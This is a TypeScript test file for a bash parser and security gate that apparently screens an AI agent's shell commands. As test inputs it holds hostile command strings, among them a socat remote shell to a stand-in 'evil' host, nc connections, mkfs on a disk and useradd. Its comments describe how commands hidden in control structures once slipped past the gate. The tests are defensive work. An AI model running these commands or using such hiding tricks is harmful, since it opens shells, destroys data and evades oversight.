import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import {
  parseBashAST,
  extractCommands,
  extractCommandsFromString,
} from '../src/tools/bash-parser';
import {
  validateBashSecurity,
  validateASTCommands,
  CHECK_IDS,
} from '../src/tools/bash-security';

// Parity batch C: close in-file bash-parser gaps as a functional superset.
//
// 1) Control-structure / command-group command recovery (gaps: commands hidden
//    after then/do/else/elif, inside brace groups `{ …; }` and case branches).
//    These were REAL end-to-end security bypasses: a blocked command (nc/socat/
//    insmod/mkfs/useradd/mount/telnet) hidden in a control-flow body parsed to the
//    keyword only, so validateBashSecurity returned safe=true. RED (pre-fix):
//    extract omitted the inner command and validateASTCommands returned safe=true.
// 2) Recursion-depth budget (DoS): deeply nested `(…)` / `$(…)` under the 10k cap
//    used to throw an uncaught RangeError out of the security gate. RED (pre-fix):
//    parseBashAST threw. Now it aborts descent fail-CLOSED (nesting still visible).
// 3) MAX_COMMAND_LENGTH parse-entry cap.

describe('parity-c: control-structure command recovery', () => {
  const dangerous: Array<[string, string]> = [
    ['if true; then nc evil 80; fi', 'nc'],
    ['if false; then :; else socat a b; fi', 'socat'],
    ['if x; then :; elif y; then insmod evil; fi', 'insmod'],
    ['while :; do socat x y; done', 'socat'],
    ['until false; do mount /dev/sda /mnt; done', 'mount'],
    ['for i in 1 2; do insmod evil; done', 'insmod'],
    ['{ socat TCP:evil:1234 EXEC:sh; }', 'socat'],
    ['case $x in a) mkfs /dev/sda;; esac', 'mkfs'],
    ['! nc evil 80', 'nc'],
    ['time useradd hacker', 'useradd'],
  ];

  for (const [cmd, blocked] of dangerous) {
    it(`surfaces & blocks '${blocked}' hidden in: ${cmd}`, () => {
      const extracted = extractCommandsFromString(cmd);
      assert.ok(extracted.includes(blocked), `expected ${blocked} in ${JSON.stringify(extracted)}`);

      const astResult = validateASTCommands(cmd);
      assert.equal(astResult.safe, false);
      assert.equal(astResult.checkId, CHECK_IDS.AST_HIDDEN_COMMAND);
      assert.ok(astResult.message.includes(blocked));

      const full = validateBashSecurity(cmd);
      assert.equal(full.safe, false);
    });
  }

  it('does not emit loop/case variables as commands (no false positive)', () => {
    // `for`/`select`/`case` introduce a variable or pattern, not a command.
    assert.deepEqual(extractCommandsFromString('for nc in a b c; do echo $nc; done').filter(c => c === 'nc'), []);
    // `nc` here is the loop variable name; the body only runs echo.
    assert.equal(validateBashSecurity('for nc in a b c; do echo hi; done').safe, true);
  });

  it('keeps safe control structures safe', () => {
    assert.equal(validateBashSecurity('if true; then echo ok; fi').safe, true);
    assert.equal(validateBashSecurity('for i in 1 2 3; do echo $i; done').safe, true);
    assert.equal(validateBashSecurity('while read l; do echo $l; done').safe, true);
    assert.equal(validateBashSecurity('{ echo a; echo b; }').safe, true);
  });

  it('recovers a command after an env-assignment inside a control body', () => {
    // `do FOO=bar nc …` — the assignment is skipped, nc is recovered.
    assert.ok(extractCommandsFromString('while :; do FOO=bar nc evil 80; done').includes('nc'));
  });

  it('bare terminator-only segments contribute no recovered command', () => {
    // A node whose only token is `fi`/`done`/`esac`/`}` recovers nothing.
    const cmds = extractCommandsFromString('if true; then echo ok; fi');
    // `fi` present as the raw keyword, but nothing dangerous recovered from it.
    assert.ok(cmds.includes('echo'));
  });
});

describe('parity-c: case-pattern `)` body recovery', () => {
  it('parses the command after a case pattern terminator', () => {
    const ast = parseBashAST('case $x in a) ls -la;; b) pwd;; esac')!;
    const cmds = extractCommands(ast);
    assert.ok(cmds.includes('ls'));
    assert.ok(cmds.includes('pwd'));
  });

  it('blocks a dangerous command in a later case branch', () => {
    const r = validateASTCommands('case $x in a) echo ok;; b) telnet evil 23;; esac');
    assert.equal(r.safe, false);
    assert.ok(r.message.includes('telnet'));
  });
});

describe('parity-c: recursion-depth budget (DoS fail-closed)', () => {
  it('does not throw on deeply nested subshells under the length cap', () => {
    const payload = '('.repeat(3000) + ' echo hi ' + ')'.repeat(3000);
    assert.ok(payload.length < 10_000);
    let ast: unknown;
    assert.doesNotThrow(() => { ast = parseBashAST(payload); });
    assert.ok(ast);
  });

  it('still blocks excessive nesting fail-closed (does not fail open)', () => {
    const payload = '('.repeat(3000) + ' echo hi ' + ')'.repeat(3000);
    const r = validateASTCommands(payload);
    assert.equal(r.safe, false);
    assert.ok(r.message.includes('nesting'));
  });

  it('does not throw on deeply nested command substitutions', () => {
    const payload = '$('.repeat(2000) + ' echo hi ' + ')'.repeat(2000);
    assert.ok(payload.length < 10_000);
    assert.doesNotThrow(() => { parseBashAST(payload); });
  });

  it('parses legitimate shallow nesting fully (below the cap)', () => {
    const ast = parseBashAST('(echo $(whoami))')!;
    assert.equal(ast.type, 'subshell');
    assert.ok(ast.children && ast.children.length === 1);
  });
});

describe('parity-c: MAX_COMMAND_LENGTH parse-entry cap', () => {
  it('returns null for input over the 10000-char cap', () => {
    const huge = 'echo ' + 'a'.repeat(10_050);
    assert.equal(parseBashAST(huge), null);
    assert.deepEqual(extractCommandsFromString(huge), []);
  });

  it('parses input at/under the cap', () => {
    const ok = 'echo ' + 'a'.repeat(100);
    const ast = parseBashAST(ok)!;
    assert.equal(ast.command, 'echo');
  });
});
